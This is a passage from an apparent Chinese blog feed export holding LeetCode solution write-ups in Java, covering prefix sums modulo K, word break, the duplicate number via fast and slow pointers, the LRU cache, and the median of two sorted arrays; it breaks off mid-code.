<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/subarray-sums-divisible-by-k" target="_blank" rel="noopener">https://leetcode-cn.com/problems/subarray-sums-divisible-by-k</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>这道题是求连续非空子数组和的问题，所以可以想到用前缀数组和问题，前缀数组：</p>
<p>$$preSum[i-1]=A[0]+A[1]+…+A[i-1]$$</p>
<p>$$preSum[j]=A[0]+A[1]+…A[j]$$</p>
<p>所以：非空子数组[i,j]和为：</p>
<p>$$preSum[j]-preSum[i-1]=A[i]+A[i+2]+…+A[j] i&lt;=j$$</p>
<p>特殊的非空子数组[0,j]的和为</p>
<p>$$ preSum[j]=A[0]+A[1]+…A[j]$$.</p>
<p>所以问题转化为求i,j试得其满足$$(preSum[j]-preSum[i])$k==0$$</p>
<p>而</p>
<p>$$  presum[i]=\begin{cases}A[0],\quad i=0\presum[i-1]+A[i],\quad i\geq 1 \end{cases}$$</p>
<p>所以先用O(n)求出preSum[i],然后用o(n**2)求出preSum[j]-preSum[i]即可。</p>
<p>空间复杂度为O(n)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subarraysDivByK</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(A.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] preSum = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">        preSum[<span class="number">0</span>] = A[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">            preSum[i] = preSum[i-<span class="number">1</span>] + A[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;A.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (preSum[j] % K == <span class="number">0</span>) &#123;</span><br><span class="line">                        sum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>((preSum[j]-preSum[i-<span class="number">1</span>])%K==<span class="number">0</span>)&#123;</span><br><span class="line">                        sum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是这样做超时了。</p>
<p>再思考下，其实这和两数和题相似，实则是两数差问题，遍历一次即可，两数差modK==0。其实将数hash后看下map中是否有相同的值，有即找出一对差。</p>
<p>遍历时，先看下map中有没有自己需要的值presum[i] mod K。如果有则计算出有多少个需要的，然后再map[presum[i] mod K]++。如果没有自己需要的值，则将自己的hash值放入:map[presum[i] mod K] = 1。</p>
<p>除此之外，还有一种特殊情况：加上本身modK等于0的preSum数量。</p>
<p><img src="/assets/image-20200527105045137.png" alt="image-20200527105045137"></p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode139-单词拆分</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode139-%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/</url>
    <content><![CDATA[<p>给定一个非空字符串 s 和一个包含非空单词列表的字典 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。</p>
<p>说明：</p>
<p>拆分时可以重复使用字典中的单词。<br>你可以假设字典中没有重复的单词。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/word-break" target="_blank" rel="noopener">https://leetcode-cn.com/problems/word-break</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>方法一、分治法</p>
<p>这个问题可以用分治法来解决，分治法的关键在于划分子问题。</p>
<p>分治三步：分解-&gt;解决-&gt;合并</p>
<ul>
<li><p>分解：假设字符串为s长度为len。分解点为j（1-len-1），子问题：s[0,j) 、s[j,len)。</p>
</li>
<li><p>解决： 对于每一个子问题s。如果s在wordDict中，则返回true，否则分解为子问题继续查找。</p>
</li>
<li><p>合并：两个子问题均为true才能为true。对于j从0-len，如果存在一个j，则结果返回true.</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(wordDict.contains(s))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;s.length();j++)&#123;</span><br><span class="line">           <span class="keyword">boolean</span> res1 = wordBreak(s.substring(<span class="number">0</span>,j),wordDict);</span><br><span class="line">           <span class="keyword">boolean</span> res2 = wordBreak(s.substring(j),wordDict);</span><br><span class="line">           <span class="keyword">if</span>(res1&amp;&amp;res2)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这种分治法有很多子问题重叠，所以需要优化，可以利用HashMap来记忆化搜索。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;String,Boolean&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(hashMap.containsKey(s))&#123;</span><br><span class="line">            <span class="keyword">return</span> hashMap.get(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(wordDict.contains(s))&#123;</span><br><span class="line">            hashMap.put(s,<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;s.length();j++)&#123;</span><br><span class="line">            <span class="keyword">boolean</span> res1 = wordBreak(s.substring(<span class="number">0</span>,j),wordDict);</span><br><span class="line">            <span class="keyword">boolean</span> res2 = wordBreak(s.substring(j),wordDict);</span><br><span class="line">            <span class="keyword">if</span>(res1&amp;&amp;res2)&#123;</span><br><span class="line">                hashMap.put(s,<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        hashMap.put(s,<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200526110315840.png" alt="image-20200526110315840"></p>
<p>方法二、动态规划方法：</p>
<p>设dp[i]为从第0点到第i点的字符串是否满足要求。注意dp[0]=0。因为空字符串一定在单词列表中。</p>
<p>转移方程：</p>
<p><img src="/assets/image-20200526110151858.png" alt="image-20200526110151858"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode287-寻找重复数</title>
    <url>/uncategorized/Leetcode287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/</url>
    <content><![CDATA[<p>给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。</p>
<p>说明：</p>
<p>不能更改原数组（假设数组是只读的）。<br>只能使用额外的 O(1) 的空间。<br>时间复杂度小于 O(n**2) 。<br>数组中只有一个重复的数字，但它可能不止重复出现一次。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/find-the-duplicate-number" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-the-duplicate-number</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>方案一、不考虑题目要求可以直接用一个hash表（Map）来存储映射，找到重复的即可，时间复杂度O(n),空间复杂度O(n)。</p>
<p>方案二、如果考虑题目要求空间复杂度为O(1)，时间复杂度小于o(n**2)。可以先用o(nlogn)的排序，再遍历一遍数组，遍历时找到与后面个数相等的数即可。</p>
<p>但是注意题目有个要求，不能更改原数组，所以排序方案不可行。再看看题目，n+1个整数的数组，数字都在1-n之间，可以想着鸽巢原理，鸽巢原理也可以转化为有向图。</p>
<p>数组转有向图：i指向(nums[i])。</p>
<p>假设数组为[1,3,4,2,2]。链表如下所示。</p>
<p><img src="/assets/image-20200526095419163.png" alt="image-20200526095419163"></p>
<p>可以推断出存在重复数的点，入度大于等于2。但是不一定只存在一个环。如下图所示：</p>
<p><img src="/assets/image-20200526095219650.png" alt="image-20200526095219650"></p>
<p>图是由0—k个强联通子图+一个循环链表构成。</p>
<p>所以我们首先把图中强连通子图排除掉就剩下一个循环链表，循环链表的入口点索引即为重复数组。</p>
<p>强连通子图也是一个循环链表，这里有个比较巧的方法就是判定环的入口点是否有两个或以上前驱点即可。用快慢指针方法可以判断循环链表入口点。</p>
<p>我们再注意一个问题，从索引0位置出发所构成的子图一定不是强连通子图，因为一定不存在nums[i]=0。所以从索引0出发一定能找到循环链表，且该循环链表的入口点一定为环入口点。</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums.length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> slow=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fast=<span class="number">0</span>;</span><br><span class="line">    slow = nums[slow];</span><br><span class="line">    fast = nums[nums[fast]];</span><br><span class="line">    <span class="keyword">while</span>(slow != fast)&#123;</span><br><span class="line">        slow = nums[slow];</span><br><span class="line">        fast = nums[nums[fast]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> slow2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(slow2 != slow)&#123;</span><br><span class="line">        slow = nums[slow];</span><br><span class="line">        slow2 = nums[slow2];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>Leetcode146-LRU缓存机制</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode146-LRU%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>运用你所掌握的数据结构，设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。</p>
<p>获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。<br>写入数据 put(key, value) - 如果密钥已经存在，则变更其数据值；如果密钥不存在，则插入该组「密钥/数据值」。当缓存容量达到上限时，它应该在写入新数据之前删除最久未使用的数据值，从而为新的数据值留出空间。</p>
<p>进阶:</p>
<p>你是否可以在 O(1) 时间复杂度内完成这两种操作？</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/lru-cache" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lru-cache</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>首先，LRU设计三个操作，初始化（选择数据结构），写入数据，获取数据。</p>
<p>分析写入数据。不存在，则插入数组。这里可以看出可以是尾插，也可以是任意位置插。容量达到上限时，还应该删除最久未使用的，所以每个数据应该还有个标志位，标志最近访问时间。</p>
<h2><span id="先构造一个未优化的lru">先构造一个未优化的LRU。</span></h2><p>用HashMap+LinkedList实现。</p>
<p>其中HashMap作为字典。LinkedList作为最近访问列表。</p>
<p>注意HashMap的底层数据结构为数组+链表+红黑树</p>
<p>LinkerList的底层数据结构为双向链表（双向队列）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    HashMap&lt;Integer,Integer&gt; map;</span><br><span class="line">    LinkedList&lt;Integer&gt; accessList;</span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        accessList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        Integer value = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        accessList.remove(<span class="keyword">new</span> Integer(key));</span><br><span class="line">        accessList.add(key);</span><br><span class="line">        <span class="comment">//System.out.printf("key:%d,value:%d\n",key,value);</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        Integer oValue = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(oValue == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.size() &gt;= capacity)&#123;</span><br><span class="line">                <span class="keyword">int</span> headKey = accessList.pop();</span><br><span class="line">                map.remove(headKey);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(key,value);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.put(key,value);</span><br><span class="line">            accessList.remove(<span class="keyword">new</span> Integer(key));</span><br><span class="line">        &#125;</span><br><span class="line">        accessList.add(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200525103456399.png" alt="image-20200525103456399"></p>
<p>时间复杂度分析:</p>
<ul>
<li>get方法</li>
</ul>
<p>accessList.remove 带来o(n)的复杂度。总复杂度o(n)</p>
<ul>
<li>put方法</li>
</ul>
<p>accessList.remove 带来o(n)的复杂度。总复杂度o(n)</p>
<h2><span id="优化后的方法">优化后的方法</span></h2><p>在Java中有一个数据结构为LinkedHashMap。其即包含HashMap，又包含双向链表。直接利用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> <span class="keyword">extends</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">Integer</span>,<span class="title">Integer</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="number">16</span>,<span class="number">0.75f</span>,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        Integer value = <span class="keyword">super</span>.get(key);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry&lt;Integer,Integer&gt; eldest)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.capacity &lt; <span class="keyword">this</span>.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意一个点LinkedHashMap初始化时一定要把accessOrder属性执行为true,这样才会根据时间顺序排序。removeEldestEntry方法为移除最老的结点，在每次插入结点后调用。</p>
<p><img src="/assets/image-20200525111627595.png" alt="image-20200525111627595"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode4-寻找两个正序数组的中位数</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode4-%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<p>给定两个大小为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。</p>
<p>请你找出这两个正序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。</p>
<p>你可以假设 nums1 和 nums2 不会同时为空。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays" target="_blank" rel="noopener">https://leetcode-cn.com/problems/median-of-two-sorted-arrays</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>注意本题讨论时数组起始位规定为1，编程时才将起始位转化为0。</p>
<p>一、nums1的数组长度为m，nums2的数组长度为n。假设总长m+n=L。</p>
<p>，将问题简化为求第k大的数即可。</p>
<ul>
<li><p>如果L为偶数，则应该求第k=L/2和第k+1=L/2+1位开始的数（从1开始）。</p>
</li>
<li><p>如果L为奇数，则应该求第k=(L+1)/2个数。</p>
</li>
</ul>
<p>二、两个数组求第k大数。</p>
<p>我们采用排除法，每次除去一半比第k个数小的数即可。</p>
<p>假设当前求第k大数，当前数组1长度为len1,数组2长度为len1。则k&lt;=max(len1,len2)，令ktmp = k//2 。</p>
<p>（1）ktmp &lt;=len1且ktmp &lt;=len2时：</p>
<p>比较nums1[ktmp]和nums2[ktmp]。</p>
<p>谁小左边数就可以排除。这样就可以排除一半的数。</p>
<p>剩下找第k=k-k//2大数即可。</p>
<p>（2）ktmp &gt;len1且ktmp &lt;=len2</p>
<p>比较nums1[len1]和nums2[ktmp]。</p>
<ul>
<li>nums1[len1] &gt;= nums2[ktmp]   排除掉nums2的ktmp左边数。剩下找第k=k-k//2大数即可。</li>
<li>nums1[len1] &lt; nums2[ktmp] 除去nums1数组，nums2寻找第(k-len1)个数即可</li>
</ul>
<p>（3）ktmp&lt;=len1且ktmp&gt;len2</p>
<p>比较nums1[ktmp]和nums2[len2]。</p>
<ul>
<li>nums1[ktmp] &gt;= nums2[len2]   排除掉nums1的ktmp左边数。剩下找第k=k-k//2大数即可。</li>
<li>nums1[ktmp] &lt; nums2[len2] 除去nums2数组，nums1寻找第(k-len2)个数即可</li>
</ul>
<p>特殊情况：</p>
<p>如果k=1时，不需排除一半，直接找即可。</p>
<p>第k+1个数只需在第k个数后面再找一个数即可。当把第k+1大的数前面的数都排除了.</p>
<p>（1）剩下两个数组时，比较两个数组的头谁最小</p>
<p>（2）剩下一个数组时，取数组头即可。</p>
<p>这里归纳一下：可以将nums1和nums2，第k大数前面的所有数剔除。</p>
<p>这样只需将nums1中前两个数字和nums2中前两个数字做运算即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">if</span>(begin1 &lt; nums1.length)&#123;</span><br><span class="line">    list.add(nums1[begin1]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(begin1 + <span class="number">1</span> &lt; nums1.length)&#123;</span><br><span class="line">    list.add(nums1[begin1+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(begin2 &lt; nums2.length)&#123;</span><br><span class="line">    list.add(nums2[begin2]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(begin2 + <span class="number">1</span> &lt; nums2.length)&#123;</span><br><span class="line">    list.add(nums2[begin2+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> minValue = list.get(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> minIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (list.get(i) &lt; minValue) &#123;</span><br><span class="line">            minValue = list.get(i);</span><br><span class="line">            minIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> secondMinValue;</span><br><span class="line">    <span class="keyword">if</span> (minIndex != <span class="number">0</span>) &#123;</span><br><span class="line">        secondMinValue = list.get(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        secondMinValue = list.get(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != minIndex &amp;&amp; list.get(i) &lt; secondMinValue) &#123;</span><br><span class="line">            secondMinValue = list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (minValue + secondMinValue) / <span class="number">2.0</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>所有代码（未优化前）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">realIndex</span><span class="params">(<span class="keyword">int</span> begin,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> begin + (index -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> L = nums1.length+nums2.length;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="keyword">boolean</span> isEven = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(L%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            k = L / <span class="number">2</span>;</span><br><span class="line">            isEven = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            k = (L+<span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> begin1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> begin2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> len1 = nums1.length;</span><br><span class="line">        <span class="keyword">int</span> len2 = nums2.length;</span><br><span class="line">        <span class="keyword">int</span> ktmp;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            ktmp = k / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(len1 == <span class="number">0</span>)&#123;</span><br><span class="line">                begin2 = begin2 + k - <span class="number">1</span>;</span><br><span class="line">                len2 = nums2.length - begin2;</span><br><span class="line">                k=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len2 == <span class="number">0</span>)&#123;</span><br><span class="line">                begin1 = begin1 + k - len2 - <span class="number">1</span>;</span><br><span class="line">                len1 = nums1.length - begin1;</span><br><span class="line">                k=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(ktmp &lt;= len1 &amp;&amp; ktmp &lt;= len2)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[realIndex(begin1,ktmp)] &gt;= nums2[realIndex(begin2,ktmp)])&#123;</span><br><span class="line">                    begin2 = begin2 + ktmp;</span><br><span class="line">                    len2 = nums2.length - begin2;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    begin1 = begin1 + ktmp;</span><br><span class="line">                    len1 = nums1.length - begin1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ktmp &gt; len1 &amp;&amp; ktmp &lt;= len2)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[realIndex(begin1,len1)] &gt;= nums2[realIndex(begin2,ktmp)])&#123;</span><br><span class="line">                    begin2 = begin2 + ktmp;</span><br><span class="line">                    len2 = nums2.length - begin2;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    begin2 = begin2 + k - len1 - <span class="number">1</span>;</span><br><span class="line">                    begin1 = len1;</span><br><span class="line">                    len1 = <span class="number">0</span>;</span><br><span class="line">                    len2 = nums2.length - begin2;</span><br><span class="line">                    k=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ktmp &lt;= len1 &amp;&amp; ktmp &gt; len2) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[realIndex(begin1,ktmp)] &lt;= nums2[realIndex(begin2,len2)]) &#123;</span><br><span class="line">                    begin1 = begin1 + ktmp;</span><br><span class="line">                    len1 = nums1.length - begin1;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    begin1 = begin1 + k - len2 - <span class="number">1</span>;</span><br><span class="line">                    begin2 = len2;</span><br><span class="line">                    len2 = <span class="number">0</span>;</span><br><span class="line">                    len1 = nums1.length - begin1;</span><br><span class="line">                    k=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            k = k - ktmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!isEven)&#123;</span><br><span class="line">            <span class="keyword">if</span>(begin1 &gt;= nums1.length || ((begin2 &lt; nums2.length) &amp;&amp; (nums1[begin1] &gt;= nums2[begin2])) )&#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[begin2];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[begin1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">if</span>(begin1 &lt; nums1.length)&#123;</span><br><span class="line">                list.add(nums1[begin1]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(begin1 + <span class="number">1</span> &lt; nums1.length)&#123;</span><br><span class="line">                list.add(nums1[begin1+<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(begin2 &lt; nums2.length)&#123;</span><br><span class="line">                list.add(nums2[begin2]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(begin2 + <span class="number">1</span> &lt; nums2.length)&#123;</span><br><span class="line">                list.add(nums2[begin2+<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> minValue = list.get(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">int</span> minIndex = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span 